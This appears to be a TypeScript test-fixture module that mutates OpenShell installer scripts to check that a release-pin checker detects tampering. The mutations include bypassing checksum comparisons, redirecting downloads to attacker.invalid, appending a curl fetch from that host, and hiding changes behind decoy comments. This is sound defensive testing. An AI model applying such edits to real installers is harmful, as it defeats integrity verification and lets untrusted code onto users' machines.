// SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { v00116Pins, v012Pins } from "./openshell-release-fixtures";

export function brevMutationFixtures(
  ASSET_DIGESTS: ReadonlyMap<string, string>,
  ASSETS: readonly string[],
  OFFICIAL_UNEXPECTED_BREV_ASSET: string,
  OFFICIAL_UNEXPECTED_BREV_DIGEST: string,
): Partial<Record<FixtureMode, (source: string) => string>> {
  const corruptFirstBrevPin = (source: string): string =>
    source.replace(ASSET_DIGESTS.get(ASSETS[0]) ?? "missing", "0".repeat(64));
  return {
    "brev-bypassed-comparison": (source) =>
      source.replace('[[ "$release_sha" == "$expected_sha" ]]', "true"),
    "brev-changed-asset": (source) =>
      source.replace(
        'openshell-x86_64-unknown-linux-musl.tar.gz" ;;',
        'openshell-driver-vm-x86_64-unknown-linux-gnu.tar.gz" ;;',
      ),
    "brev-changed-extraction-target": (source) =>
      source.replace(
        'tar xzf "$tmpdir/$asset" -C "$tmpdir"',
        'tar xzf "$tmpdir/$asset" -C /usr/local/bin',
      ),
    "brev-changed-url": (source) =>
      source.replace(
        "https://github.com/NVIDIA/OpenShell/releases/download/${OPENSHELL_VERSION}/${asset}",
        "https://attacker.invalid/openshell/${OPENSHELL_VERSION}/${asset}",
      ),
    "brev-comment-decoy": (source) => {
      const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
      const comparison = '[[ "$release_sha" == "$expected_sha" ]]';
      return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"').replace(comparison, "true")}\n# ${lookup}\n# ${comparison}\n`;
    },
    "brev-dead-code-decoy": (source) => {
      const lookup = 'expected_sha="$(openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"';
      return `${source.replace(lookup, 'expected_sha="$(attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset")"')}\nif false; then\n  ${lookup}\nfi\n`;
    },
    "brev-decoy-table": (source) =>
      source.replace(
        'openshell_cli_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
        'attacker_pinned_sha256 "$OPENSHELL_VERSION" "$asset"',
      ),
    "brev-bypassed-verifier-call": (source) =>
      source.replace('verify_openshell_cli_asset "$tmpdir" "$asset"', ":"),
    "brev-extra-download": (source) => `${source}\ncurl -fsSL https://attacker.invalid/openshell\n`,
    "brev-indirect-selector-override": (source) =>
      `${source}\nselector=OPENSHELL_VERSION\ndeclare "$selector=v9.9.9"\n`,
    "brev-later-selector-override": (source) => `${source}\nOPENSHELL_VERSION="v9.9.9"\n`,
    "brev-literalized-pin-selector": (source) =>
      source.replace('case "${release_tag}:${asset}" in', "case '${release_tag}:${asset}' in"),
    "brev-mismatch": corruptFirstBrevPin,
    "brev-sha-command-bypass": (source) => source.replace("sha_cmd=(sha256sum)", "sha_cmd=(true)"),
    "duplicate-brev-pin": (source) => {
      const pinLine = `      printf '%s\\n' "${ASSET_DIGESTS.get(ASSETS[0])}"`;
      return source.replace(pinLine, `${pinLine}\n${pinLine}`);
    },
    "missing-brev-pin": (source) =>
      source.replace(ASSET_DIGESTS.get(ASSETS[1]) ?? "missing", "missing"),
    "mismatched-table-versions": (source) => source.replaceAll("v0.0.116:", "v0.0.117:"),
    "official-but-unexpected-brev-asset": (source) =>
      source
        .replace(`v0.0.116:${ASSETS[1]})`, `v0.0.116:${OFFICIAL_UNEXPECTED_BREV_ASSET})`)
        .replace(ASSET_DIGESTS.get(ASSETS[1] ?? "") ?? "missing", OFFICIAL_UNEXPECTED_BREV_DIGEST),
    "pr-checker-bypass": corruptFirstBrevPin,
    "pr-parser-bypass": corruptFirstBrevPin,
    "brev-stable-version-drift": (source) =>
      source.replace(
        'stable | auto) OPENSHELL_VERSION="v0.0.116" ;;',
        'stable | auto) OPENSHELL_VERSION="v0.0.117" ;;',
      ),
    "runtime-consumers-newer-than-tables": (source) =>
      source.replace(
        'stable | auto) OPENSHELL_VERSION="v0.0.116" ;;',
        'stable | auto) OPENSHELL_VERSION="v0.0.117" ;;',
      ),
  };
}

const MACOS_METHOD_START = `MACOS_INSTALL_METHOD="\${_NEMOCLAW_OPENSHELL_INSTALL_METHOD:-auto}"`;
const MACOS_METHOD_END = "esac\n";

export function installerReleaseTemplate(source: string, version: string): string {
  const v012Comment =
    "  # OpenShell 0.1.2 enforces MCP policy in its supervisor image. Recognize\n" +
    "  # only its exact pinned sandbox artifacts here, not version text alone.\n" +
    "  # Runtime policy verification still precedes credential/provider changes.\n";
  if (version !== "0.1.2" && source.includes(v012Comment)) {
    const fallback =
      "    local sandbox_digest\n" +
      '    sandbox_digest="$(file_sha256 "$sandbox_bin")" || return 1\n' +
      '    if [ "$(pinned_sandbox_build_version "$sandbox_digest")" = "0.1.2" ]; then\n' +
      "      return 0\n" +
      "    fi\n";
    assert.ok(source.includes(fallback), "OpenShell 0.1.2 sandbox fixture fallback");
    source = source
      .replace(
        v012Comment,
        "  # MCP policy enforcement and credential replacement execute in\n" +
          "  # openshell-sandbox. When that host artifact is present, require the native\n" +
          "  # MCP policy marker from that exact binary.\n",
      )
      .replace(fallback, "");
  }
  if (version === "0.0.106" || version === "0.0.116" || version === "0.1.2") return source;
  const start = source.indexOf(MACOS_METHOD_START);
  const end = source.indexOf(MACOS_METHOD_END, start);
  if (start === -1 || end === -1 || source.indexOf(MACOS_METHOD_START, start + 1) !== -1) {
    throw new Error("Expected one macOS install-method binding");
  }
  return `${source.slice(0, start)}${source.slice(end + MACOS_METHOD_END.length)}`.replaceAll(
    "test/install/",
    "test/",
  );
}

export function addV00106OperationalTrust(source: string): string {
  const withIdentityCheck = source.replace(
    "pinned_sandbox_build_version() {",
    `is_pinned_openshell_v00106_linux_x86_64_install() {
  local openshell_bin="$1"
  local gateway_bin="$2"
  local sandbox_bin="$3"
  local openshell_sha gateway_sha sandbox_sha

  [ "$OS" = "Linux" ] && [ "$ARCH_LABEL" = "x86_64" ] || return 1
  openshell_sha="$(file_sha256 "$openshell_bin")" || return 1
  gateway_sha="$(file_sha256 "$gateway_bin")" || return 1
  sandbox_sha="$(file_sha256 "$sandbox_bin")" || return 1
  [ "$openshell_sha" = "98ecf95113fea999e94a928043e57b04cf58a45a1b66ae8bffc73d1bc8bb1d59" ] \\
    && [ "$gateway_sha" = "e6cde8a54568aa1926ff6584ffd6984314c68dad64d2722509618a74094c622c" ] \\
    && [ "$sandbox_sha" = "019301ec8618abbed8135e8d39dde7bea47e5e92813bbc17768550de34db59f8" ]
}

pinned_sandbox_build_version() {`,
  );
  const capabilityMarker = "  # OpenShell #1865 has no authoritative CLI/RPC capability query yet.";
  const result = withIdentityCheck.replace(
    capabilityMarker,
    `  # The v0.0.106 release binaries are stripped and no longer retain every
  # source-level capability marker used by the development-build fallback
  # below. Accept only the reviewed executable byte identities as the stable
  # release capability proof; arbitrary binaries that merely report 0.0.106
  # must still pass the fail-closed marker checks.
  if is_pinned_openshell_v00106_linux_x86_64_install \\
    "$openshell_bin" "$gateway_bin" "$sandbox_bin"; then
    return 0
  fi

${capabilityMarker}`,
  );
  assert.notEqual(withIdentityCheck, source, "v0.0.106 executable identity helper");
  assert.notEqual(result, withIdentityCheck, "v0.0.106 capability proof");
  return result;
}

export function removeV00106OperationalTrust(source: string): string {
  const identityStart = source.indexOf("is_pinned_openshell_v00106_linux_x86_64_install() {");
  const sandboxStart = source.indexOf("pinned_sandbox_build_version() {", identityStart);
  assert.ok(![identityStart, sandboxStart].includes(-1), "v0.0.106 helper boundaries");
  const withoutIdentity = `${source.slice(0, identityStart)}${source.slice(sandboxStart)}`;
  const capabilityStart = withoutIdentity.indexOf(
    "  # The v0.0.106 release binaries are stripped and no longer retain every",
  );
  const fallbackStart = withoutIdentity.indexOf(
    "  # OpenShell #1865 has no authoritative CLI/RPC capability query yet.",
    capabilityStart,
  );
  assert.ok(![capabilityStart, fallbackStart].includes(-1), "v0.0.106 proof boundaries");
  return `${withoutIdentity.slice(0, capabilityStart)}${withoutIdentity.slice(fallbackStart)}`;
}

export function prepareReleaseFixtureRuntime(repoRoot: string, root: string): void {
  const runtimePath = "src/lib/onboard/docker-driver-gateway-runtime.ts";
  const candidatePins = fs.readFileSync(path.join(root, runtimePath), "utf8");
  const source = fs.readFileSync(path.join(repoRoot, runtimePath), "utf8");
  const prepared = source.replace(
    /const OPENSHELL_SUPERVISOR_MANIFEST_DIGESTS: Readonly<Record<string, string>> = \{[\s\S]*?\n\};/,
    candidatePins.trim(),
  );
  fs.writeFileSync(path.join(root, runtimePath), prepared);
}

export function alterRequiredReleaseValue(
  root: string,
  name: string,
  value: string,
  label: string,
): void {
  const file = path.join(root, name);
  const before = fs.readFileSync(file, "utf8");
  if (!before.includes(value)) {
    throw new Error(`Mutation fixture lacks the expected ${label} input`);
  }
  const replacement = value.startsWith("https:")
    ? "https://attacker.invalid/"
    : (value.startsWith("sha256:") ? "sha256:" : "") + "0".repeat(64);
  fs.writeFileSync(file, before.replace(value, replacement));
}

export function preparedReleaseArgs(repoRoot: string, root: string, format = "json"): string[] {
  return [
    "--no-warnings",
    path.join(repoRoot, "scripts/checks/extract-installer-pins.mts"),
    "--blueprint",
    path.join(root, "nemoclaw-blueprint/blueprint.yaml"),
    "--installer",
    path.join(root, "scripts/install-openshell.sh"),
    "--brev-installer",
    path.join(root, "scripts/brev-launchable-ci-cpu.sh"),
    "--supervisor-runtime",
    path.join(root, "src/lib/onboard/docker-driver-gateway-runtime.ts"),
    "--format",
    format,
  ];
}

export type FixtureMode =
  | "allowlisted-alternate-version"
  | "brev-bypassed-comparison"
  | "brev-changed-asset"
  | "brev-changed-extraction-target"
  | "brev-changed-url"
  | "brev-comment-decoy"
  | "brev-dead-code-decoy"
  | "brev-decoy-table"
  | "brev-bypassed-verifier-call"
  | "brev-extra-download"
  | "brev-indirect-selector-override"
  | "brev-later-selector-override"
  | "brev-literalized-pin-selector"
  | "brev-mismatch"
  | "brev-sha-command-bypass"
  | "complete"
  | "duplicate-brev-pin"
  | "duplicate-installer-pin"
  | "failure"
  | "formula-mismatch"
  | "formula-pin-mismatch"
  | "formula-self-authorized"
  | "incomplete-trusted-allowlist"
  | "installer-max-version-drift"
  | "installer-bypassed-comparison"
  | "installer-changed-asset"
  | "installer-changed-checksum"
  | "installer-changed-extraction-target"
  | "installer-changed-url"
  | "installer-comment-decoy"
  | "installer-dead-code-decoy"
  | "installer-decoy-table"
  | "installer-dev-min-version-drift"
  | "installer-extra-download"
  | "installer-indirect-selector-override"
  | "installer-later-min-selector-override"
  | "installer-later-selector-override"
  | "installer-literalized-pin-input"
  | "installer-min-version-drift"
  | "installer-homebrew-untrust-cleanup-drift"
  | "installer-homebrew-trust-transition-drift"
  | "installer-homebrew-trust-transition-stable-leak"
  | "installer-homebrew-trust-transition-complete-current"
  | "installer-pin-selector-drift"
  | "installer-sha-command-bypass"
  | "mismatched-table-versions"
  | "missing-brev-pin"
  | "missing-trusted-formula"
  | "malformed-trusted-formula"
  | "mismatched-trusted-formula-url"
  | "multiple-installer-versions"
  | "non-regular-brev-input"
  | "official-but-unexpected-brev-asset"
  | "official-but-unexpected-installer-asset"
  | "oversized-installer-input"
  | "partial"
  | "partial-asset-missing"
  | "partial-manifest-missing"
  | "pr-checker-bypass"
  | "pr-parser-bypass"
  | "brev-stable-version-drift"
  | "runtime-consumers-newer-than-tables"
  | "stable-gnu-v00116"
  | "symlink-installer-input"
  | "symlink-scripts-parent"
  | "duplicate-trusted-release"
  | "trusted-formula-mismatch";

// Historical prospective templates are authorized for 0.0.116 only.
// Keep their fixtures on that release even when the checkout selects 0.1.2.
export function supervisorV00116Fixtures(selected: {
  blueprint: string;
  brevInstaller: string;
  installer: string;
  supervisorRuntime: string;
}) {
  const pins = v00116Pins("installer");
  const restorePins = (source: string) =>
    v012Pins("installer").reduce((result, pin) => {
      const original = pins.find((entry) => entry.asset === pin.asset);
      assert.ok(original, "0.0.116 fixture pin must exist");
      return result.replaceAll(pin.sha256, original.sha256);
    }, source);
  return {
    blueprint: selected.blueprint.replaceAll(
      'openshell_version: "0.1.2"',
      'openshell_version: "0.0.116"',
    ),
    brevInstaller: restorePins(selected.brevInstaller).replaceAll("0.1.2", "0.0.116"),
    installer: restorePins(installerReleaseTemplate(selected.installer, "0.0.116"))
      .replaceAll('VERSION="0.1.2"', 'VERSION="0.0.116"')
      .replaceAll("v0.1.2:", "v0.0.116:"),
    supervisorRuntime: selected.supervisorRuntime.replace(
      'const QUALIFIED_STABLE_OPENSHELL_VERSION = "0.1.2";',
      'const QUALIFIED_STABLE_OPENSHELL_VERSION = "0.0.116";',
    ),
  };
}
